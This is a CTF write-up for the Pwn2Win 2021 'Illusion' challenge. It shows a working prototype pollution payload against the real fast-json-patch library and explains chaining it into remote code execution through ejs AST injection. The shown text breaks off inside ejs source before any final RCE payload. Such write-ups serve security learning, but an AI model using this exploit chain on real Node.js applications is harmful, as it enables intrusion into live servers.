<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <link rel="preconnect" href="https://fonts.googleapis.com">
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link href="https://fonts.googleapis.com/css2?family=Finger+Paint&family=Roboto:wght@100&display=swap" rel="stylesheet">
        <link href="/fonts/meslo.ttf" rel="stylesheet">
        <title>Pwn2Win Illusion challenge - Prototype Pollution to RCE</title>        
    <link rel="stylesheet" href="/assets/404.b2188d1d.css" /></head>

    <body class="
        bg-[#3a3e4a]
        font-meslo
        pb-5

        flex
        flex-col

        pt-[2vh]
        pr-[25vh]
        pl-[25vh]
        gap-5
    ">
      <div class="
        flex 
        flex-row 
        truncate
        gap-5
      ">
        <div class="
          flex
          border-dashed
          border-2
          border-gray-500
          rounded-lg
        ">
          <div class="
	bg-[#464b59]
	rounded-lg
	text-white
	p-5
">
	<div class="
    p-4
    font-bold
    text-3xl
    text-center
    hover:animate-waving-hand
">
    <button onclick="
        (document.referrer.includes(document.location.host)
        && document.location.origin + '/' == document.referer
        )
        ? window.history.back()
        : window.location.href = '/'
    ">ðŸ‘ˆ</button>
</div>
</div>
        </div>
        <div class="
          rounded-lg
          shrink grow
          border-dashed
          border-2
          border-gray-500
        ">
          <div class="
	bg-[#464b59]
	rounded-lg
	text-white
	p-5
">
	<div class="
	p-2
	font-navpost
	text-center
  text-yellow-300
	text-3xl
">
	<a href="pwn2win-2021-illusion-web-challenge">
		Pwn2Win Illusion challenge - Prototype Pollution to RCE
	</a>
</div>

<p class="
	font-sans
	text-center
  text-gray-300
	italic 
	hover:not-italic">
	Reading time: 8 minutes
</p>
</div>
        </div>
      </div>

    <div class="
      bg-[#434854]
      rounded-lg
      text-gray-300
      tracking-wider
      px-8

      cursor-auto

      border-dashed
      border-2
      border-gray-500
      
      min-w-full
      static
      gap-1
      leading-7

      prose
      prose-headings:text-yellow-400
      prose-em:text-yellow-400

      prose-a:text-yellow-400 
      hover:prose-a:text-yellow-600
      prose-a:cursor-pointer

      prose-code:text-yellow-400
      prose-code:before:content-['']
      prose-code:after:content-['']

      prose-strong:text-yellow-400
      
      prose-img:rounded-xl
      prose-img:min-w-full

      prose-img:outline
      prose-img:outline-offset-2 
      prose-img:outline-4

      prose-pre:outline
      prose-pre:outline-offset-2 
      prose-pre:outline-4

      text-lg
      text-justify
      prose-h1:before:content-['#_']
      prose-h2:before:content-['#_']
      prose-h3:before:content-['#_']
      prose-h4:before:content-['#_']
      prose-h5:before:content-['#_']
      
      prose-h1:text-2xl
      prose-h2:text-xl
      prose-h3:text-xl
      prose-h4:text-xl
      prose-h5:text-xl
      
      prose-h1:leading-8
      prose-h2:leading-8
      prose-h3:leading-8
      prose-h4:leading-8
      prose-h5:leading-8
      
      prose-h1:font-navpost
      prose-h2:font-navpost
      prose-h3:font-navpost
      prose-h4:font-navpost
      prose-h5:font-navpost

      list-inside
      marker:text-yellow-400
    " id="post">
      <div class="
          prose-img:border-4
          prose-img:border-gray-500
        ">
          <img src="/images/pwn2win-2021.jpeg">
        </div>
      <h2 id="introduction">Introduction</h2>
<p>This write-up aims to demonstrate a solution for the <a href="https://pwn2.win/challenges/illusion" target="_blank" rel="noopener noreferrer">Illusion challenge</a>. For the following reading, it is highly recommended previously understanding the concept of <a href="https://portswigger.net/daily-swig/prototype-pollution-the-dangerous-and-underrated-vulnerability-impacting-javascript-applications" target="_blank" rel="noopener noreferrer">Prototype Pollution vulnerability</a>.</p>
<p><strong>Table of contents</strong>:</p>
<ul>
<li><a href="#Recon">Recon</a></li>
<li><a href="#Prototype-Pollution-in-fast-json-patch">Prototype Pollution in fast-json-patch</a></li>
<li><a href="#Remote-Code-Execution-via-AST-Injection">Remote Code Execution via AST Injection</a></li>
</ul>
<p><strong>Resources</strong>: <a href="https://github.com/EffectRenan/CTF/tree/pwn2win-2021/web/Illusion" target="_blank" rel="noopener noreferrer">illusion.tar.gz and PoC</a>.</p>
<h2 id="recon">Recon</h2>
<h3 id="dockerfile">Dockerfile</h3>
<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #F8F8F2">FROM node:alpine</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">EXPOSE 1337</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">COPY flag.txt /root/flag.txt</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">COPY readflag /</span></span>
<span class="line"><span style="color: #F8F8F2">RUN chmod 4755 /readflag</span></span></code></pre>
<p>The important information here is <code>readflag</code> binary. So we need to find a way to execute the <code>readflag</code> binary on the server machine to get the flag.</p>
<h3 id="indexjs">index.js</h3>
<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> express </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">require</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'express'</span><span style="color: #F8F8F2">)</span></span>
<span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> bodyParser </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">require</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'body-parser'</span><span style="color: #F8F8F2">)</span></span>
<span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> jsonpatch </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">require</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'fast-json-patch'</span><span style="color: #F8F8F2">)</span></span>
<span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> ejs </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">require</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'ejs'</span><span style="color: #F8F8F2">)</span></span>
<span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> basicAuth </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">require</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'express-basic-auth'</span><span style="color: #F8F8F2">)</span></span>
<span class="line"></span>
<span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> app </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">express</span><span style="color: #F8F8F2">()</span></span>
<span class="line"></span>
<span class="line"><span style="color: #88846F">/* Middlewares */</span></span>
<span class="line"><span style="color: #F8F8F2">app.</span><span style="color: #A6E22E">use</span><span style="color: #F8F8F2">(bodyParser.</span><span style="color: #A6E22E">json</span><span style="color: #F8F8F2">())</span></span>
<span class="line"><span style="color: #F8F8F2">app.</span><span style="color: #A6E22E">use</span><span style="color: #F8F8F2">(</span><span style="color: #A6E22E">basicAuth</span><span style="color: #F8F8F2">({</span></span>
<span class="line"><span style="color: #F8F8F2">    users: { </span><span style="color: #E6DB74">"admin"</span><span style="color: #F8F8F2">: process.env.SECRET </span><span style="color: #F92672">||</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"admin"</span><span style="color: #F8F8F2"> },</span></span>
<span class="line"><span style="color: #F8F8F2">    challenge: </span><span style="color: #AE81FF">true</span></span>
<span class="line"><span style="color: #F8F8F2">}))</span></span>
<span class="line"></span></code></pre>
<p>The web application was developed in Node.JS and the content is being hosted through <code>ExpressJS</code> framework. Also, there are two middlewares:</p>
<ul>
<li><code>bodyParser.json</code>: It allows us to send a JSON file content.</li>
<li><code>basicAuth</code>: All requests must be authenticated.</li>
</ul>
<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #66D9EF">let</span><span style="color: #F8F8F2"> services </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> {</span></span>
<span class="line"><span style="color: #F8F8F2">    status: </span><span style="color: #E6DB74">"online"</span><span style="color: #F8F8F2">,</span></span>
<span class="line"><span style="color: #F8F8F2">    cameras: </span><span style="color: #E6DB74">"online"</span><span style="color: #F8F8F2">,</span></span>
<span class="line"><span style="color: #F8F8F2">    doors: </span><span style="color: #E6DB74">"online"</span><span style="color: #F8F8F2">,</span></span>
<span class="line"><span style="color: #F8F8F2">    dome: </span><span style="color: #E6DB74">"online"</span><span style="color: #F8F8F2">,</span></span>
<span class="line"><span style="color: #F8F8F2">    turrets: </span><span style="color: #E6DB74">"online"</span></span>
<span class="line"><span style="color: #F8F8F2">}</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">app.</span><span style="color: #A6E22E">get</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">"/"</span><span style="color: #F8F8F2">, </span><span style="color: #F92672">async</span><span style="color: #F8F8F2"> (</span><span style="color: #FD971F">req</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">res</span><span style="color: #F8F8F2">) </span><span style="color: #66D9EF">=></span><span style="color: #F8F8F2"> {</span></span>
<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> html </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">await</span><span style="color: #F8F8F2"> ejs.</span><span style="color: #A6E22E">renderFile</span><span style="color: #F8F8F2">(__dirname </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"/templates/index.ejs"</span><span style="color: #F8F8F2">, {services})</span></span>
<span class="line"><span style="color: #F8F8F2">    res.</span><span style="color: #A6E22E">end</span><span style="color: #F8F8F2">(html)</span></span>
<span class="line"><span style="color: #F8F8F2">})</span></span></code></pre>
<p>The homepage only returns the content of <code>index.ejs</code> template interpreted by <code>ejs</code> library.</p>
<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #F8F8F2">app.</span><span style="color: #A6E22E">post</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">"/change_status"</span><span style="color: #F8F8F2">, (</span><span style="color: #FD971F">req</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">res</span><span style="color: #F8F8F2">) </span><span style="color: #66D9EF">=></span><span style="color: #F8F8F2"> {</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #66D9EF">let</span><span style="color: #F8F8F2"> patch </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> []</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">    Object.</span><span style="color: #A6E22E">entries</span><span style="color: #F8F8F2">(req.body).</span><span style="color: #A6E22E">forEach</span><span style="color: #F8F8F2">(([</span><span style="color: #FD971F">service</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">status</span><span style="color: #F8F8F2">]) </span><span style="color: #66D9EF">=></span><span style="color: #F8F8F2"> {</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">        </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> (service </span><span style="color: #F92672">===</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"status"</span><span style="color: #F8F8F2">){</span></span>
<span class="line"><span style="color: #F8F8F2">            res.</span><span style="color: #A6E22E">status</span><span style="color: #F8F8F2">(</span><span style="color: #AE81FF">400</span><span style="color: #F8F8F2">).</span><span style="color: #A6E22E">end</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">"Cannot change all services status"</span><span style="color: #F8F8F2">)</span></span>
<span class="line"><span style="color: #F8F8F2">            </span><span style="color: #F92672">return</span></span>
<span class="line"><span style="color: #F8F8F2">        }</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">        patch.</span><span style="color: #A6E22E">push</span><span style="color: #F8F8F2">({</span></span>
<span class="line"><span style="color: #F8F8F2">            </span><span style="color: #E6DB74">"op"</span><span style="color: #F8F8F2">: </span><span style="color: #E6DB74">"replace"</span><span style="color: #F8F8F2">,</span></span>
<span class="line"><span style="color: #F8F8F2">            </span><span style="color: #E6DB74">"path"</span><span style="color: #F8F8F2">: </span><span style="color: #E6DB74">"/"</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">+</span><span style="color: #F8F8F2"> service,</span></span>
<span class="line"><span style="color: #F8F8F2">            </span><span style="color: #E6DB74">"value"</span><span style="color: #F8F8F2">: status</span></span>
<span class="line"><span style="color: #F8F8F2">        })</span></span>
<span class="line"><span style="color: #F8F8F2">    });</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">    jsonpatch.</span><span style="color: #A6E22E">applyPatch</span><span style="color: #F8F8F2">(services, patch)</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> (</span><span style="color: #E6DB74">"offline"</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">in</span><span style="color: #F8F8F2"> Object.</span><span style="color: #A6E22E">values</span><span style="color: #F8F8F2">(services)){</span></span>
<span class="line"><span style="color: #F8F8F2">        services.status </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">"offline"</span></span>
<span class="line"><span style="color: #F8F8F2">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">    res.</span><span style="color: #A6E22E">json</span><span style="color: #F8F8F2">(services)</span></span>
<span class="line"><span style="color: #F8F8F2">}</span></span></code></pre>
<p>The endpoint <code>change_status</code> accepts a <code>POST</code> request and expects a JSON file content. In the line <code>5</code>, the <code>Object.entries</code> get the properties of the JSON file, which <code>service</code> represents the property name and <code>status</code> represents the content.</p>
<p>In the line <code>12</code>, the array <code>patch</code> pushes an object based on the service and status provided by the request data. In the line <code>19</code>, the function <code>applyPatch</code> is called based on the services and the array updated before.</p>
<p>With all information from the source code and our goal to execute OS commands on the server, the app is working with JSON files and we might guess that something related to <code>Prototype Pollution</code> vulnerability can be exploitable. Therefore, the line <code>19</code> is the only that looks promising for this guessing. So we have to look at the source code of <code>fast-json-patch</code> library and analyze what the <code>applyPatch</code> function does.</p>
<p>Before, we can search for some vulnerabilities in this library. Looking at the <a href="https://github.com/Starcounter-Jack/JSON-Patch/pull/262" target="_blank" rel="noopener noreferrer">PRs</a> on GitHub repository, we can find a <code>Prototype Pollution</code> vulnerability reported by <a href="https://huntr.dev/users/alromh87" target="_blank" rel="noopener noreferrer">Alejandro Romero (alromh87)</a> through <a href="https://huntr.dev/" target="_blank" rel="noopener noreferrer">Huntr</a> platform, which was not patched yet.</p>
<h2 id="prototype-pollution-in-fast-json-patch">Prototype Pollution in fast-json-patch</h2>
<p>We already have the payload to exploit <code>Prototype Pollution</code> provided by the disclosure, but letâ€™s look at how this vulnerability happens.</p>
<p>Payload:</p>
<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> fastjsonpatch </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">require</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'fast-json-patch'</span><span style="color: #F8F8F2">);</span></span>
<span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> a </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> {};</span></span>
<span class="line"><span style="color: #66D9EF">const</span><span style="color: #F8F8F2"> patch </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> [{op: </span><span style="color: #E6DB74">"replace"</span><span style="color: #F8F8F2">, path: </span><span style="color: #E6DB74">"/constructor/prototype/polluted"</span><span style="color: #F8F8F2">, value: </span><span style="color: #E6DB74">"Yes! Its Polluted"</span><span style="color: #F8F8F2">}];</span></span>
<span class="line"><span style="color: #F8F8F2">fastjsonpatch.</span><span style="color: #A6E22E">applyPatch</span><span style="color: #F8F8F2">(a, patch);</span></span></code></pre>
<h3 id="vulnerable-code">Vulnerable code</h3>
<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #66D9EF">function</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">applyPatch</span><span style="color: #F8F8F2">(</span><span style="color: #FD971F">document</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">patch</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">validateOperation</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">mutateDocument</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">banPrototypeModifications</span><span style="color: #F8F8F2">) {</span></span>
<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #F92672">...</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> results </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">new</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">Array</span><span style="color: #F8F8F2">(patch.length);</span></span>
<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #F92672">for</span><span style="color: #F8F8F2"> (</span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> i </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">0</span><span style="color: #F8F8F2">, length_1 </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> patch.length; i </span><span style="color: #F92672">&#x3C;</span><span style="color: #F8F8F2"> length_1; i</span><span style="color: #F92672">++</span><span style="color: #F8F8F2">) {</span></span>
<span class="line"><span style="color: #F8F8F2">        results[i] </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">applyOperation</span><span style="color: #F8F8F2">(document, patch[i], validateOperation, </span><span style="color: #AE81FF">true</span><span style="color: #F8F8F2">, banPrototypeModifications, i);</span></span>
<span class="line"><span style="color: #F8F8F2">        document </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> results[i].newDocument;</span></span>
<span class="line"><span style="color: #F8F8F2">    }</span></span>
<span class="line"><span style="color: #F8F8F2">    results.newDocument </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> document;</span></span>
<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> results;</span></span>
<span class="line"><span style="color: #F8F8F2">}</span></span></code></pre>
<p>Based on the payload, the parameter <code>document</code> represents the empty object <code>a</code>. Looking at the line <code>6</code>, the function <code>applyOperation</code> is called, which our empty object <code>a</code> is the first parameter and the single object inside the <code>patch</code> array is the second parameter.</p>
<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #66D9EF">function</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">applyOperation</span><span style="color: #F8F8F2">(</span><span style="color: #FD971F">document</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">operation</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">validateOperation</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">mutateDocument</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">banPrototypeModifications</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">index</span><span style="color: #F8F8F2">) {</span></span>
<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #F92672">...</span></span>
<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> (operation.path </span><span style="color: #F92672">===</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">""</span><span style="color: #F8F8F2">) {</span></span>
<span class="line"><span style="color: #F8F8F2">        </span><span style="color: #F92672">...</span></span>
<span class="line"><span style="color: #F8F8F2">    } </span><span style="color: #F92672">else</span><span style="color: #F8F8F2"> {</span></span>
<span class="line"><span style="color: #F8F8F2">        </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> path </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> operation.path </span><span style="color: #F92672">||</span><span style="color: #F8F8F2"> </span><span style="color: #E6DB74">""</span><span style="color: #F8F8F2">;</span></span>
<span class="line"><span style="color: #F8F8F2">        </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> keys </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> path.</span><span style="color: #A6E22E">split</span><span style="color: #F8F8F2">(</span><span style="color: #E6DB74">'/'</span><span style="color: #F8F8F2">);</span></span>
<span class="line"><span style="color: #F8F8F2">        </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> obj </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> document;</span></span>
<span class="line"><span style="color: #F8F8F2">        </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> t </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #AE81FF">1</span><span style="color: #F8F8F2">;</span></span>
<span class="line"><span style="color: #F8F8F2">        </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> len </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> keys.length;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">        </span><span style="color: #F92672">...</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">        </span><span style="color: #F92672">while</span><span style="color: #F8F8F2"> (</span><span style="color: #AE81FF">true</span><span style="color: #F8F8F2">) {</span></span>
<span class="line"><span style="color: #F8F8F2">            key </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> keys[t];</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">            t</span><span style="color: #F92672">++</span><span style="color: #F8F8F2">;</span></span>
<span class="line"><span style="color: #F8F8F2">            </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> (</span><span style="color: #F92672">...</span><span style="color: #F8F8F2">) {</span></span>
<span class="line"><span style="color: #F8F8F2">                </span><span style="color: #F92672">...</span></span>
<span class="line"><span style="color: #F8F8F2">            } </span><span style="color: #F92672">else</span><span style="color: #F8F8F2"> {</span></span>
<span class="line"><span style="color: #F8F8F2">                </span><span style="color: #F92672">...</span></span>
<span class="line"><span style="color: #F8F8F2">                </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> (t </span><span style="color: #F92672">>=</span><span style="color: #F8F8F2"> len) {</span></span>
<span class="line"><span style="color: #F8F8F2">                    </span></span>
<span class="line"><span style="color: #F8F8F2">                    </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> returnValue </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> objOps[operation.op].</span><span style="color: #A6E22E">call</span><span style="color: #F8F8F2">(operation, obj, key, document);</span></span>
<span class="line"><span style="color: #F8F8F2">                    </span><span style="color: #F92672">...</span></span>
<span class="line"><span style="color: #F8F8F2">                    </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> returnValue;</span></span>
<span class="line"><span style="color: #F8F8F2">                }</span></span>
<span class="line"><span style="color: #F8F8F2">            }</span></span>
<span class="line"><span style="color: #F8F8F2">            obj </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> obj[key];</span></span>
<span class="line"><span style="color: #F8F8F2">        }</span></span>
<span class="line"><span style="color: #F8F8F2">    }</span></span></code></pre>
<p>Now the payload makes sense. In the line <code>7</code>, our path <code>/constructor/prototype/polluted</code> is split by <code>/</code> and it stores the result into the <code>keys</code> variable. The empty object <code>a</code> now is referenced by <code>obj</code>. The variable <code>t</code> represents a counter for the while loop.</p>
<p>As the <code>keys</code> array has 3 values, the while repeats 3 times. The <code>else</code> statement is executed only in the last time, in other words, when <code>key</code> variable represents the content <code>polluted</code>.</p>
<p>In the line <code>23</code>, the <code>objOps</code> represents all functions available to use. For our payload, <code>operation.op</code> represents the string <code>replace</code>. Thus, the replace function is finally called.</p>
<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> objOps </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> {</span></span>
<span class="line"><span style="color: #F8F8F2">    </span><span style="color: #F92672">...</span></span>
<span class="line"><span style="color: #F8F8F2">     ,</span></span>
<span class="line"><span style="color: #F8F8F2">     </span><span style="color: #A6E22E">replace</span><span style="color: #F8F8F2">: </span><span style="color: #66D9EF">function</span><span style="color: #F8F8F2"> (</span><span style="color: #FD971F">obj</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">key</span><span style="color: #F8F8F2">, </span><span style="color: #FD971F">document</span><span style="color: #F8F8F2">) {</span></span>
<span class="line"><span style="color: #F8F8F2">         </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> removed </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> obj[key];</span></span>
<span class="line"><span style="color: #F8F8F2">         obj[key] </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #FD971F">this</span><span style="color: #F8F8F2">.value;</span></span>
<span class="line"><span style="color: #F8F8F2">         </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> { newDocument: document, removed: removed };</span></span>
<span class="line"><span style="color: #F8F8F2">     }</span></span>
<span class="line"><span style="color: #F8F8F2">     ,</span></span>
<span class="line"><span style="color: #F8F8F2">     </span><span style="color: #F92672">...</span></span></code></pre>
<p>The behavior of the <code>replace</code> function is shown above. The explanation of Prototype Pollution be exploitable is the fact of the replace function is based on the last object property provided. We can notice our payload <code>/constructor/prototype/polluted</code> was split and became an array, like <code>["constructor", "prototype", "polluted"]</code>. Therefore, in the last step when the <code>replace</code> function is called, the last object was the <code>prototype</code> itself. Consequently, the <code>applyOperation</code> function does something similar to: <code>obj["constructor"]["prototype"]["polluted"] = "Yes! Its Polluted"</code>.</p>
<h2 id="remote-code-execution-via-ast-injection">Remote Code Execution via AST Injection</h2>
<h3 id="ast-injection">AST Injection</h3>
<p>Briefly, <a href="https://en.wikipedia.org/wiki/Abstract_syntax_tree" target="_blank" rel="noopener noreferrer">Abstract Syntax Tree</a> injection is a type of vulnerability in which is possible to inject AST in some context. In some cases, the impact of this vulnerability is the influence of the parsing or compiling process, which will lead to code execution. To know more about this, check the <a href="https://blog.p6.is/AST-Injection/" target="_blank" rel="noopener noreferrer">blog post</a> out published by <a href="https://twitter.com/po6ix" target="_blank" rel="noopener noreferrer">POSIX</a> (it has great examples showing similar scenarios).</p>
<p>As we have a possibility to create any object property with Prototype Pollution, it is possible to change/create a property to influence the compiling process.</p>
<p>The template engines are great to explore AST injection. In our recon step, we noticed that the app is using the template engine <code>ejs</code> when we make a GET request to homepage. Hence, we need to find where in the code is sensitive to this exploration based on <code>ejs.renderFile</code>.</p>
<h3 id="ast-injection-in-ejs">AST injection in ejs</h3>
<pre is:raw="" class="astro-code" style="background-color: #272822; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;"><code><span class="line"><span style="color: #66D9EF">exports</span><span style="color: #F8F8F2">.</span><span style="color: #A6E22E">renderFile</span><span style="color: #F8F8F2"> </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">function</span><span style="color: #F8F8F2"> () {</span></span>
<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> args </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> </span><span style="color: #66D9EF">Array</span><span style="color: #F8F8F2">.prototype.slice.</span><span style="color: #A6E22E">call</span><span style="color: #F8F8F2">(</span><span style="color: #FD971F">arguments</span><span style="color: #F8F8F2">);</span></span>
<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> filename </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> args.</span><span style="color: #A6E22E">shift</span><span style="color: #F8F8F2">();</span></span>
<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> cb;</span></span>
<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> opts </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> {filename: filename};</span></span>
<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> data;</span></span>
<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #66D9EF">var</span><span style="color: #F8F8F2"> viewOpts;</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #F92672">...</span></span>
<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #F92672">if</span><span style="color: #F8F8F2"> (args.length) {</span></span>
<span class="line"><span style="color: #F8F8F2">    data </span><span style="color: #F92672">=</span><span style="color: #F8F8F2"> args.</span><span style="color: #A6E22E">shift</span><span style="color: #F8F8F2">();</span></span>
<span class="line"><span style="color: #F8F8F2">  }</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #F92672">...</span></span>
<span class="line"></span>
<span class="line"><span style="color: #F8F8F2">  </span><span style="color: #F92672">return</span><span style="color: #F8F8F2"> </span><span style="color: #A6E22E">tryHandleCache</span><span style="color: #F8F8F2">(opts, data, cb);</span></span>
<span class="line"><span style="color: #F8F8F2">}</span></span>
<span class="line"></span>
